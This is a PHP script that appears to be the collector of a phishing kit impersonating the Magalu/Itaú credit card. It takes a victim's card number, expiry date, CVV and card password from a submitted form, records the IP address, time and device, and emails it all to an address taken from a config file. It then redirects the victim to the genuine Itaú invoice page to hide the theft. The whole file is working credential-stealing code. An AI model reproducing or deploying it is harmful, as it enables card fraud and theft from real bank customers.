<?php


include_once("config.php");

 $cc=$_POST['cc'];
 $data1=$_POST['data1'];
$cvv=$_POST['cvv1'];
 $senha1=$_POST['senha1'];

        $ip= getenv("REMOTE_ADDR");
        date_default_timezone_set('America/Sao_Paulo');
        $data = date('d/m/Y H:i:s', time());
        $http = $_SERVER['HTTP_USER_AGENT'];

$to="$email";
$subject="$cc";
$message= " 
| --------------------------- <br>
|<strong> Info Magalu </strong> <br>
|<strong> CC:</strong> $cc <br>
|<strong> Validade:</strong> $data1 <br>
|<strong> CVV:</strong> $cvv <br>
|<strong> SENHA:</strong> $senha1  <br>
|<strong> IP:</strong> $ip  <br>
|<strong> Data:</strong> $data  <br>
|<strong> Dispositivo:</strong> $http  <br>
| ---------------------------";

$header= "MIME-Version: 1.0\n";
$header .= "Content-type: text/html; charset=iso-8859-1\n";
$header .= "From: Info Magalu: \n";
mail($to, $subject, $message, $header);
header('Refresh: 4;URL=https://www.itau.com.br/cartoes/magalu/consulte-sua-fatura/');